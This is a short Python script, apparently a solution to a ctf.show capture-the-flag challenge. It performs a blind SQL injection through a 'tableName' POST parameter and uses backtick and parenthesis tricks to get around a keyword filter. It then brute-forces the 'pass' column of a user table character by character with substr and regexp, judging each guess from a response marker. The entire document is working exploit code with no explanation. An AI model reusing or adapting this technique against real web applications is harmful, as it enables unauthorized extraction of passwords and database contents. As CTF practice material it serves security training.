# @Author:Y4tacker
import requests

url = 'http://0a180e9f-3b1b-49fa-a79b-efc32209cccb.challenge.ctf.show/select-waf.php'
flagstr = r"abcdefghijklmnopqrstuvwxyz{}-0123456789"
res = ""
for i in range(1,50):
    for j in flagstr:
        data = {
            'tableName': f"`ctfshow_user`where(substr(`pass`,{i},1))regexp(\'{j}\')"
        }
        r = requests.post(url, data=data)
        if r.text.find("$user_count = 1;") > 0:
            res += j
            print(res)
            break
